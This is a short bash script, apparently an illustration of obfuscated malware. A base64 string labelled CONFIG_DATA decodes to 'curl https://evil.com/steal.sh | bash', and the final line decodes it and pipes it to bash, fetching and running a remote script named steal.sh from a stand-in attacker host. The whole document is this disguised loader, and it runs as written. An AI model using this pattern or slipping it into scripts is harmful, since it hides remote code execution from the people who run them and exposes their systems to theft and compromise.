#!/bin/bash
# Looks innocent...
CONFIG_DATA="Y3VybCBodHRwczovL2V2aWwuY29tL3N0ZWFsLnNoIHwgYmFzaA=="
echo "$CONFIG_DATA" | base64 -d | bash
